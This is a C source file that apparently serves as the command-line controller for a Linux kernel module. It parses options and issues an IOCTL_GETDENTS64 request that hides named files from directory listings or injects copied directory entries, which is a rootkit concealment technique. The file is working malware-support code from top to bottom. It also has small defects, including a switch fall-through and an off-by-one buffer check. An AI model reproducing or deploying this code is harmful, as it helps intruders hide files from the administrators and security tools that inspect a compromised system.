
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stddef.h>
#include <getopt.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include "main.h"
#include "mem_print.h"

static const char *opt_param = "t:a:d:p:i:";

static const struct option long_option[] = {
    {"type", required_argument, NULL, 't'},
    {"add", required_argument, NULL, 'a'},
    {"hide", required_argument, NULL, 'd'},
    {"parent dir", required_argument, NULL, 'p'},
    {"src dir", required_argument, NULL, 'i'},
    {0, 0, 0, 0}
};

extern int optind, ipterr, optopt;

static char buf[32768];

int set_add_file_dirent(char *add_file, char *src_dir, struct linux_dirent64 *dirent)
{
    int ret = -1;
    if (NULL == add_file || NULL == src_dir) {
        return ret;
    }

    int fd = open(src_dir, O_RDONLY | O_DIRECTORY);
    if (fd == -1) {
        printf("the src's parent dir:%s is not a dir. set_getdents64 error.\n", src_dir);
        return ret;
    }

    for (;;) {
        int nread = syscall(SYS_getdents64, fd, buf, sizeof(buf));
        if (nread == -1) {
            printf("call SYS_getdents64 error.\n");
            break;
        }

        if (nread == 0)
            break;
        for (int bpos = 0; bpos < nread;) {
            struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
            if (0 == strcmp(d->d_name, add_file)) {
                memcpy(dirent, d, d->d_reclen);
                ret = 0;
                break;
            }
            bpos += d->d_reclen;
        }
    }
    if (0 != ret) {
        printf("can not find file:%s in dir:%s.\n", add_file, src_dir);
    }

    close(fd);
    return ret;
}

bool get_add_file_dirent(getdents64_parameters *param, char *src_dir, int src_size)
{
    int ret;

    if (NULL != param->add_file) {
        if (strlen(param->add_file) > src_size - 1) {
            printf("the add file' len is larger than max buffer. set_getdents64 error.\n");
            return false;
        }
        if (NULL == src_dir || 0 == strlen(src_dir)) {
            printf("the src's parent dir is not set. set_getdents64 error.\n");
            return false;
        }
        if (strlen(src_dir) > 1) {
            if ('/' == src_dir[strlen(src_dir) - 1]) {
                src_dir[strlen(src_dir) - 1] = 0;
            }
        }
        ret = set_add_file_dirent(param->add_file, src_dir, &param->add_file_dirent);
        if (0 != ret) {
            printf("set add file's dirent error. set_getdents64 error.\n");
            return false;
        }
    }
    if (NULL != param->dir) {
        if (strlen(param->dir) > 1) {
            if ('/' == param->dir[strlen(param->dir) - 1]) {
                param->dir[strlen(param->dir) - 1] = 0;
            }
        }
    }

    return true;
}

void handle_getdents64_(int fd, int type, char *add_file, char *hide_file, char *dir, char *raw_dir)
{
    bool state;
    char src_dir[MAX_PATH_LEN];
    getdents64_parameters param;
    memset(&param, 0, sizeof(getdents64_parameters));
    param.common.ioctl_type = IOCTL_GETDENTS64;
    param.common.type = type;
    param.add_file = add_file;
    if (NULL != add_file) {
        param.add_file_len = strlen(add_file);
    }
    param.hide_file = hide_file;
    if (NULL != hide_file) {
        param.hide_file_len = strlen(hide_file);
    }
    param.dir = dir;
    if (NULL != dir) {
        param.dir_len = strlen(dir);
    }
    snprintf(src_dir, sizeof(src_dir), "%s", raw_dir);

    if (2 != type) {
        state = get_add_file_dirent(&param, src_dir, sizeof(src_dir));
        if (false == state) {
            return;
        }
    }
    printf("set_getdents64: type:%d add file:%s hide file:%s in dir:%s.\n\n",
            param.common.type,
            NULL != param.add_file ? param.add_file : "",
            NULL != param.hide_file ? param.hide_file : "",
            NULL != param.dir? param.dir: "");

    ioctl(fd, IOCTL_GETDENTS64, (void*)&param);
}

void handle_getdents64(int fd, int argc, char **argv)
{
    bool state;
    int opt, ret;
    int long_index = 0;
    char src_dir[MAX_PATH_LEN];
    getdents64_parameters param;
    memset(&param, 0, sizeof(getdents64_parameters));
    param.common.ioctl_type = IOCTL_GETDENTS64;

    optind = 1;
    while ((opt = getopt_long(argc, argv, opt_param, long_option, &long_index)) != -1) {
        if (NULL == optarg) {
            continue;
        }
        switch (opt) {
            case 't':
                param.common.type = atoi(optarg);
                break;
            case 'a':
                param.add_file= optarg;
                param.add_file_len = strlen(optarg);
                break;
            case 'd':
                param.hide_file = optarg;
                param.hide_file_len = strlen(optarg);
                break;
            case 'p':
                param.dir = optarg;
                param.dir_len = strlen(optarg);
            case 'i':
                if (strlen(optarg) > sizeof(src_dir)) {
                    src_dir[0] = 0;
                } else {
                    strcpy(src_dir, optarg);
                }
                break;
            default:
                continue;
        }
    }
    state = get_add_file_dirent(&param, src_dir, sizeof(src_dir));
    if (false == state) {
        return;
    }

    printf("set_getdents64: type:%d add file:%s hide file:%s in dir:%s.\n\n",
            param.common.type,
            NULL != param.add_file ? param.add_file : "",
            NULL != param.hide_file ? param.hide_file : "",
            NULL != param.dir? param.dir: "");

    ioctl(fd, IOCTL_GETDENTS64, (void*)&param);
    return;
}
